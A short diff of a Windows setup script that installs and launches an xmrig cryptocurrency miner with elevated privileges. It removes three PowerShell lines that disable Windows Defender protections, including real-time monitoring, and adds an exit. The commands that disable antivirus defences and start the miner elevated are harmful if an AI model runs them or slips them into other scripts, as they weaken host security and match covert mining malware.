@@ -10,6 +10,4 @@ powershell.exe  "Start-Sleep -Seconds 2"
 powershell.exe  "Copy-Item -Path C:\ZEPHYRUN.bat -Destination C:\xmrig-6.22.2\ZEPHYRUN.bat -Force"
 powershell.exe  "Copy-Item -Path C:\config.json -Destination C:\xmrig-6.22.2\config.json -Force"
 powershell.exe  "Start-Process -FilePath 'C:\xmrig-6.22.2\ZEPHYRUN.bat' -ArgumentList '/S' -Verb RunAs"
-powershell.exe  "Set-ItemProperty -Path 'HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender' -Name 'DisableAntiSpyware' -Value 1"
-powershell.exe  "Set-ItemProperty -Path 'HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender' -Name 'SubmitSamplesConsent' -Value 2"
-powershell.exe  "Set-MpPreference -DisableRealtimeMonitoring $true"
+powershell.exe exit
